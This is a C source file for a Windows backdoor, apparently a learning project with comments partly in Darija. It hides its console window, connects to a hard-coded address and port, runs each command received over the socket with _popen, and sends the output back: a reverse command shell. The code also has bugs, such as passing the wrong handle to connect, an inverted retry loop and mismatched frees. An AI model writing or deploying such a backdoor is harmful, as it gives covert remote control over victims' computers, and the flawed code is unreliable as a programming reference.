#include "./includes/backdoor.h"

void mimik_shell(int socketfd)
{
	char	buffer[1024];
    char    container[1024];
    char    total[18500];
	int		recieved_bytes;
	int		total_recieved_bytes;
	char	*data;
    char    *temp;

	data = NULL;
	recieved_bytes = 0;
	total_recieved_bytes = 0;
    while (1)
    {
        recieved_bytes = recv(socketfd, buffer, sizeof(buffer), 0);
        temp = realloc(data, total_recieved_bytes + recieved_bytes);
        if (!temp)
            ft_perror("Error Occurred With Memory", data);
        data = temp;
        memcpy(data + total_recieved_bytes, buffer, recieved_bytes);
        printf("%s\n", data);
        total_recieved_bytes += recieved_bytes;
        if (strncmp("q", data, 1) == 0)
        {
            closesocket(socketfd);
            WSACleanup();
            free(temp), temp = NULL;
            free(data), data = NULL;
            exit(0);
        }
        else
        {
            FILE *Processfd;

            Processfd = _popen(buffer, "r");
            while (fgets(container, 1024, Processfd) != NULL)
                strcat(total, container);
            send(socketfd, total, sizeof(total), 0);
            free(temp), temp = NULL;
            free(data), data = NULL;
            fclose(Processfd);
        }
    }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HWND wininit; // this just like a reference for the window needed to initialize the window
	int *my_socket;
	struct sockaddr_in ServInit;
	UINT16 PortNum;
	char *Server_IP;
	WSADATA WsaData;
	int connection;
	
	AllocConsole(); // hadi kan creati Leena new console and kat associatiha M3a stdin stdout and stderr    wininit = FindWindowA("Console", NULL);
	ShowWindow(wininit, 0);
	Server_IP = "127.0.0.1"; 
	PortNum = 2000;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData)) // this function used to initialize windows sockets it Takes two parameters <winsock version> and <WSADATA struct>
		ft_perror("Error Occurred With Sockets");
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (socket == -1)
		ft_perror("Error Occurred With Sockets");
	memset(&ServInit, 0, sizeof(ServInit));
	ServInit.sin_family = AF_INET;
	ServInit.sin_addr.s_addr = inet_addr(Server_IP);
	ServInit.sin_port = htons(PortNum);
	start: // these are assembly labels start: jump: goto kda; we used them hna to make a indirectly infinite loop
	while (!(connect(socket, &ServInit, sizeof(ServInit))))
	{
		sleep(10);
		goto start;
	}
}